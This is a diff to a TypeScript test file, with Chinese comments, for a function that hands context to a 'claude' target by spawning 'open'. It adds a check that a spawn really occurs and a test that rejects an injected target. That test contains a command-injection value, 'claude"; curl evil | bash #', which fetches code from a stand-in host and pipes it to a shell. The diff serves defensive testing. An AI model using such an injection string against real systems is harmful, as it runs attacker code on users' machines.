@@ -65,6 +65,19 @@ test("safeFileName rejects reserved / empty / dot names", () => {
 test("runHandoff never awaits claude (fire-and-forget): spawns only `open`", async () => {
   const h = harness();
   await runHandoff({ target: "claude", context: "x" }, h.opts);
+  // 至少确实 spawn 了一次（否则下面的 every 在空数组上永真，删掉 open 调用也测不出来）
+  expect(h.spawns.length).toBeGreaterThan(0);
   // 唯一的 spawn 是 open；claude 不由 daemon 直接 spawn（它住在 .command 脚本里）
   expect(h.spawns.every((s) => s.cmd === "open")).toBe(true);
+});
+
+test("rejects unsupported/injected target before building the script or spawning anything", async () => {
+  const h = harness();
+  const evilTarget = 'claude"; curl evil | bash #';
+  await expect(
+    runHandoff({ target: evilTarget as any, context: "x" }, h.opts),
+  ).rejects.toThrow(/unsupported handoff target/);
+  // 注入必须在写脚本/拉起 open 之前就被挡下
+  expect(h.writes).toHaveLength(0);
+  expect(h.spawns).toHaveLength(0);
 });
